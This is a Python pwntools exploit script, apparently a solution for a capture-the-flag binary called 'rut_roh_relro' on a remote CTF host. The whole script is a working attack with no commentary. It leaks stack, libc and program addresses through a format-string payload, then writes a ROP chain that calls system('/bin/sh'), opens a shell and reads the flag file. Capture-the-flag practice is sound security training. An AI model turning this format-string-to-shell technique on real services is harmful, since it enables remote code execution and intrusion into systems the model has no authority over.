from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./rut_roh_relro"
libc_path = "./libc.so.6"
ld_path = "./ld-2.31.so"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process(vuln_path)
    #io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("lac.tf", 31134)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


# leak rsp_add lib_add elf_add
delta = 0x7fff50afc8b0 - 0x7fff50afc5c0
libcdelate = 0x7f57df429d0a - 0x7f57df406000
elfdelate = 0x56509590e220 - 0x0056509590d000

payload = "%68$p-%71$p-%70$p"
io.sendlineafter("to post?\n", payload)
io.recvuntil("\n")
rbp_0x200 = int(io.recvuntil("-")[:-1], 16) - delta
libc.address = int(io.recvuntil("-")[:-1], 16) - libcdelate
elf.address = int(io.recvuntil("\n"), 16) - elfdelate
success("rsp -> " + hex(rbp_0x200))
success("libcaddress -> " + hex(libc.address))
success("elfcaddress -> " + hex(elf.address))

# return to ROP
leave_ret = elf.address + 0x0000000000001217
ret = elf.address + 0x0000000000001016
pop_rdi = elf.address + 0x000000000000127b

rbp = rbp_0x200 + 0x200
write_dict = {
    rbp + 8: p64(pop_rdi),
    rbp + 16: next(libc.search(b"/bin/sh\x00")),
    rbp + 24: p64(ret),
    rbp + 32: p64(libc.symbols["system"])
}

payload = fmtstr_payload(6, write_dict, write_size="short")

io.sendlineafter("like to post?", payload)

io.sendline("cat flag.txt")
io.interactive()
